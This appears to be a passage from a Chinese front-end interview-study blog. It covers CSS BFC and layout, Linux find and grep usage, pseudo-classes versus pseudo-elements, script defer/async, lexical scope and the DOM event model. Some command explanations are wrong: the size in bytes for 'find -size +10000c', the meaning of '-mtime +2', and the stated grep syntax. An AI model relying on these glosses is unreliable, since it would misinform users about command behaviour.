class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>使用 vw + calc 实现（兼容性不佳）：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">*&#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.main</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.main</span>&gt;<span class="selector-tag">div</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="built_in">calc</span>((100vw - 300px) / <span class="number">3</span>);</span><br><span class="line">  <span class="attribute">height</span>: <span class="built_in">calc</span>((100vw - 300px) / <span class="number">3</span>);</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#f00</span>;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h2><h3 id="BFC概念"><a href="#BFC概念" class="headerlink" title="BFC概念"></a>BFC概念</h3><p>BFC（Block formatting context）直译为“块级格式化上下文”，只有块级的盒子参与，内部规定了块级盒子如何布局。</p>
<p>BFC是一个独立的布局环境，其中的元素布局是不受外界的影响。</p>
<p>display属性为block、table、list-item的元素默认会产生BFC。也可以手动创建，如果将一个div（默认为块级元素，即本身拥有BFC）设置为inline-block，会产生一个<strong><em>新</em></strong>的BFC。</p>
<h3 id="如何创建BFC"><a href="#如何创建BFC" class="headerlink" title="如何创建BFC"></a>如何创建BFC</h3><ol>
<li>float属性不为none</li>
<li>position属性为absolute或fixed</li>
<li>display为inline-block、flex、inline-flex、table-cell</li>
<li>overflow不为visible</li>
</ol>
<h3 id="BFC布局特性"><a href="#BFC布局特性" class="headerlink" title="BFC布局特性"></a>BFC布局特性</h3><ol>
<li>在BFC中，盒子从顶端开始垂直往下排列</li>
<li>盒子垂直方向的间距由margin决定，属于同一个BFC的两个相邻的盒子margin会发生重叠 </li>
<li>在BFC中，每一个盒子的左外边缘（<code>margin-left</code>）会触碰到容器的左内边缘（<code>padding-left</code>）</li>
<li>BFC的区域不会与浮动盒子产生交集，而是紧贴浮动边缘</li>
<li>在计算BFC的高度时，也会检测浮动或定位的盒子高度</li>
</ol>
<h3 id="BFC的作用"><a href="#BFC的作用" class="headerlink" title="BFC的作用"></a>BFC的作用</h3><ol>
<li><p>清除浮动<br>只要把父元素设置为BFC，就可以清除子元素的浮动了，如：常使用 <code>overflow:hidden</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;&#125;</span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以给div设置以下这些样式</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">  <span class="comment">/*推荐第一种*/</span></span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">overflow</span>: auto;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 可以解决p的浮动问题，但同时增加了div自己的浮动问题 */</span></span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 可以解决p的浮动问题，但是同时让div没有宽度，只是被p给撑起来了 */</span></span><br><span class="line">  <span class="attribute">display</span>: inline-block; </span><br><span class="line">  <span class="attribute">display</span>: table-cell;</span><br><span class="line">  <span class="attribute">display</span>: inline-flex;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>解决外边距合并问题<br>只要创建不属于同一个BFC，外边距就不会发生合并，如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"p2"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#f00</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有两个p（块级元素，本身拥有同一个BFC），都设置 <code>marign</code> 时，默认p1的 <code>marign-bottom</code> 和p2的 <code>margin-top</code> 会发生合并，只表现出一个30px的间距。<br><img src="../images/css/css_bfc3.png" title="BFC解决margin合并"><br>如何解决呢？可以让p2产生一个新的BFC，只要不p1、p2不属于同一个BFC，<code>margin</code> 就不会发生合并。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.p2</span>&#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">display</span>: inline-flex;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上这些属性都可以直接作用于某个盒子本身，然后产生一个新的BFC。当然也可以有更多的办法：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用div包裹p2，然后给div这个父级设置样式，这个时候就有了更多的选择，任选一种即可。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">display</span>: inline-flex;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="comment">/* 除了上面这些，还可添加这些作用于父级的样式 */</span></span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">overflow</span>: auto;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">display</span>: table-cell;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>自适应两列布局<br>根据特性3: 每一个盒子的左外边缘（marigin）会触碰容器的左内边缘（border-left），即使是浮动元素。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>LEFT<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>RIGHT<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#f00</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#0f0</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#00f</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">40px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从下图可以看出：left的margin-left外边缘（蓝色margin 5px左侧）和父级容器（body）的padding-left（红色border 5px内侧）内边相触碰。<br><img src="../images/css/css_bfc1.png" title="BFC实现两列布局"></p>
<p>再根据特性4：BFC的区域不会与浮动盒子产生交集，而是紧贴浮动边缘。<br>让right单独成一个BFC，添加样式：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.right</span>&#123;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样就实现两列布局了，并且right布局可以自适应<br><img src="../images/css/css_bfc2.png" title="BFC实现两列布局"></p>
</li>
</ol>
<hr>
<h2 id="linux-查找文件的命令"><a href="#linux-查找文件的命令" class="headerlink" title="linux 查找文件的命令"></a>linux 查找文件的命令</h2><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>基本格式：<code>find path expression</code></p>
<ol>
<li>按照文件名查找<ul>
<li><code>find / -name httpd.conf</code>　　#在根目录下查找文件httpd.conf，表示在整个硬盘查找</li>
<li><code>find /etc -name httpd.conf</code>　　#在/etc目录下文件httpd.conf</li>
<li><code>find /etc -name &#39;*srm*&#39;</code>　　#使用通配符*(0或者任意多个)。表示在/etc目录下查找文件名中含有字符串‘srm’的文件</li>
<li><code>find . -name &#39;srm*&#39;</code> 　　#表示当前目录下查找文件名开头是字符串‘srm’的文件</li>
</ul>
</li>
<li>按照文件特征查找<ul>
<li><code>find / -amin -10</code> 　　# 查找在系统中最后10分钟访问的文件(access time)</li>
<li><code>find / -atime -2</code>　　 # 查找在系统中最后48小时访问的文件</li>
<li><code>find / -empty</code> 　　# 查找在系统中为空的文件或者文件夹</li>
<li><code>find / -group cat</code> 　　# 查找在系统中属于 group为cat的文件</li>
<li><code>find / -mmin -5</code> 　　# 查找在系统中最后5分钟里修改过的文件(modify time)</li>
<li><code>find / -mtime -1</code> 　　#查找在系统中最后24小时里修改过的文件</li>
<li><code>find / -user fred</code> 　　#查找在系统中属于fred这个用户的文件</li>
<li><code>find / -size +10000c</code>　　#查找出大于10000000字节的文件(c:字节，w:双字，k:KB，M:MB，G:GB)</li>
<li><code>find / -size -1000k</code> 　　#查找出小于1000KB的文件</li>
</ul>
</li>
<li>使用混合查找方式查找文件<ul>
<li><code>find /tmp -size +10000c -and -mtime +2</code> 　　#在/tmp目录下查找大于10000字节并在最后2分钟内修改的文件</li>
<li><code>find / -user fred -or -user george</code> 　　#在/目录下查找用户是fred或者george的文件文件</li>
<li><code>find /tmp ! -user panda</code>　　#在/tmp目录中查找所有不属于panda用户的文件</li>
</ul>
</li>
</ol>
<h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p>基本格式：<code>find  expression</code></p>
<ol>
<li>主要参数<br><strong>[options]主要参数：</strong><br>－c：只输出匹配行的计数。<br>－i：不区分大小写<br>－h：查询多文件时不显示文件名。<br>－l：查询多文件时只输出包含匹配字符的文件名。<br>－n：显示匹配行及行号。<br>－s：不显示不存在或无匹配文本的错误信息。<br>－v：显示不包含匹配文本的所有行。</li>
</ol>
<p><strong>pattern正则表达式主要参数：</strong><br>\： 忽略正则表达式中特殊字符的原有含义。<br>^：匹配正则表达式的开始行。<br>$: 匹配正则表达式的结束行。<br>\&lt;：从匹配正则表达 式的行开始。<br>>：到匹配正则表达式的行结束。<br>[ ]：单个字符，如[A]即A符合要求 。<br>[ - ]：范围，如[A-Z]，即A、B、C一直到Z都符合要求 。<br>.：所有的单个字符。</p>
<ul>
<li>：有字符，长度可以为0。</li>
</ul>
<ol start="2">
<li>实例</li>
</ol>
<ul>
<li><code>grep &#39;test&#39; d*</code>　　#显示所有以d开头的文件中包含 test的行</li>
<li><code>grep ‘test’ aa bb cc</code> 　　 #显示在aa，bb，cc文件中包含test的行</li>
<li><code>grep ‘[a-z]\{5\}’ aa</code> 　　#显示所有包含每行字符串至少有5个连续小写字符的字符串的行</li>
<li><code>grep magic /usr/src</code>　　#显示/usr/src目录下的文件(不含子目录)包含magic的行</li>
<li><code>grep -r magic /usr/src</code>　　#显示/usr/src目录下的文件(包含子目录)包含magic的行</li>
<li><code>grep -w pattern files</code>   #只匹配整个单词，而不是字符串的一部分(如匹配’magic’，而不是’magical’)，</li>
</ul>
<hr>
<h2 id="css伪类和伪元素的区别"><a href="#css伪类和伪元素的区别" class="headerlink" title="css伪类和伪元素的区别"></a>css伪类和伪元素的区别</h2><h3 id="伪类"><a href="#伪类" class="headerlink" title="伪类"></a>伪类</h3><p><strong><em>伪类</em></strong> 用于选择DOM树上元素不同的状态，或者是DOM上无法用简单选择器选择的元素</p>
<ul>
<li><p>状态伪类<br><strong><em>状态伪类</em></strong> 是基于元素当前状态进行选择的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:link  :hover  :active  :visited</span><br><span class="line">:focus  :disabled  :enable  :checked</span><br></pre></td></tr></table></figure>
</li>
<li><p>结构伪类<br><strong><em>结构性伪类</em></strong> 是css3新增选择器，利用dom树进行元素过滤，通过文档结构的互相关系来匹配元素，能够减少class和id属性的定义，使文档结构更简洁。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:first-child  :last-child  :nth-child(n)  :nth-last-child() </span><br><span class="line">:empty</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h3><p><strong><em>伪元素</em></strong> 是对元素中的特定内容进行操作，而不是描述状态。(css3中使用::)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">::first-letter  ::first-line  ::before  ::after  ::selection</span><br></pre></td></tr></table></figure></p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>在css3中，为了一个规范，我们使用 <code>:</code>表示伪类，<code>::</code> 表示伪元素，但是在css2中定义的伪元素，用来 <code>:</code> 和 <code>::</code> 都是可以的。如 <code>:before</code> 和 <code>::before</code> 作用是一样的</p>
<h3 id="伪元素的用途"><a href="#伪元素的用途" class="headerlink" title="伪元素的用途"></a>伪元素的用途</h3><ol>
<li><p>清除浮动</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 父级 */</span></span><br><span class="line"><span class="selector-class">.clear</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>画中间带文字的分割线<br><img src="../images/css/css_line.png" title="css分割线"></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.spliter</span><span class="selector-pseudo">::before</span>, <span class="selector-class">.spliter</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">border-top</span>: <span class="number">1px</span> solid black;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>形变的布局（上下、左右不一样）<br>原理同2</p>
</li>
<li><p>增大点击热区</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.btn</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: -<span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">right</span>: -<span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: -<span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">left</span>: -<span class="number">10px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>伪元素的本质是在不增加dom结构的基础上添加的一个元素，在用法上跟真正的dom无本质区别。普通元素能实现的效果，伪元素都可以。有些用伪元素效果更好，代码更精简。</p>
<hr>
<h2 id="script-defer-和-async"><a href="#script-defer-和-async" class="headerlink" title="script defer 和 async"></a>script defer 和 async</h2><h3 id="无defer和async"><a href="#无defer和async" class="headerlink" title="无defer和async"></a>无defer和async</h3><p>当没有 <code>defer</code> 和 <code>async</code> 的时候，js会按照顺序来渲染和执行，如：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>a.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">debugger</span></span><br></pre></td></tr></table></figure></p>
<p>在 <code>debugger</code> 执行的时候，页面还未渲染 <code>p</code> 段落。</p>
<h3 id="有defer"><a href="#有defer" class="headerlink" title="有defer"></a>有defer</h3><p><code>defer</code> 属性标注的脚本是 <strong>延迟脚本</strong>，使得浏览器延迟脚本的执行，也就是说，脚本会被 <strong>异步下载</strong> 但是不会被执行，直到文档的载入和解析完成，并可以操作，脚本才会被执行。<br><strong>延迟脚本</strong> 会按他们在文档里的出现顺序执行</p>
<h3 id="有async"><a href="#有async" class="headerlink" title="有async"></a>有async</h3><p><code>async</code> 属性标注的脚本是 <strong>异步脚本</strong>，即异步下载脚本时，不会阻塞文档解析，但是一旦下载完后，立即执行，阻塞文档解析。<br><strong>异步脚本</strong> 在它们载入后执行，但是不能保证执行顺序。</p>
<h3 id="图例"><a href="#图例" class="headerlink" title="图例"></a>图例</h3><p><img src="../images/javascript/defer_async.jpg" title="defer和async图解"><br><strong><span style="color:green;">绿色线</span></strong> 代表 <code>HTML</code> 解析，<strong><span style="color:blue;">蓝色线</span></strong> 代表网络读取 <code>JS</code>，<strong><span style="color:red;">红色线</span></strong> 代表 <code>JS</code> 执行时间。</p>
<hr>
<h2 id="静态（词法）作用域语言-和-动态作用域语言"><a href="#静态（词法）作用域语言-和-动态作用域语言" class="headerlink" title="静态（词法）作用域语言 和 动态作用域语言"></a>静态（词法）作用域语言 和 动态作用域语言</h2><ul>
<li>静态作用域语言：指变量的作用域是在代码编译阶段确定的，又称之为词法作用域。<code>JavaScript</code> 是静态作用域。</li>
<li>动态作用域语言：指变量作用域是在代码执行阶段确定的。</li>
</ul>
<p>理解 <code>JavaScript</code> 静态作用域的关键在于理解变量的作用域是由使用该变量的源代码位置确定，而不是由调用该变量时候的位置确定。<br>如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> v = <span class="string">"out"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outside</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> v = <span class="string">"in"</span>;</span><br><span class="line">  <span class="keyword">return</span> inside();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inside</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line">outside();</span><br></pre></td></tr></table></figure></p>
<p>比较<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> v = <span class="string">"out"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outside</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> v = <span class="string">"in"</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">inside</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> inside();</span><br><span class="line">&#125;</span><br><span class="line">outside();</span><br></pre></td></tr></table></figure></p>
<p>第一段代码的执行结果是”out”，而第二段代码的执行结果是”in”。</p>
<hr>
<h2 id="js事件模型"><a href="#js事件模型" class="headerlink" title="js事件模型"></a>js事件模型</h2><p>一个事件的发生包含三个过程：</p>
<ol>
<li>事件捕获阶段<br>事件捕获：当某个元素触发事件，顶层对象document就会发出一个事件流，随着DOM树的节点向目标元素流去。直到到达目标元素，在这个过程中，事件相应的监听函数是不会被触发的。</li>
<li>事件目标阶段<br>当到达目标元素后，执行目标元素相应的事件处理函数，如果没有绑定事件处理函数，则不触发。</li>
<li>事件冒泡阶段<br>从目标元素开始，向顶层元素开始冒泡。途中如果有节点绑定了相应的处理函数，则会被触发。</li>
</ol>
<image src="../images/javascript/js_event_model.png" title="js事件模型">

<p>所有的事件类型都会经历捕获，但只有部分事件会经历事件冒泡，如submit事件就不会被冒泡。</p>
<p>如何阻止冒泡：<br>W3C: e.stopPropagation()<br>IE: e.cancelBubble = true</p>
<p>标准的事件监听器如何绑定：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">target.addEventListener(type, listener[, options]); </span><br><span class="line">target.addEventListener(type, listener[, useCapture]);</span><br></pre></td></tr></table></figure></p>
<p>第三个参数可以设置为boolean类型（useCapture）或者object类型(options)</p>
<p>useCapture：指定是否在捕获阶段进行处理，默认为false，表示在冒泡阶段处理，为true表示在捕获阶段处理。</p>
<p>options: 包含三个布尔值<br>  1). capture，是否使用事件捕获，同useCapture<br>  2). once，是否只调用一次，会在调用后自动销毁（无需手动removeListener），默认值false<br>  3). passive，如果为true，表示listener永远不会调用preventDefault()方法</p>
<p>例：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div2"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn"</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
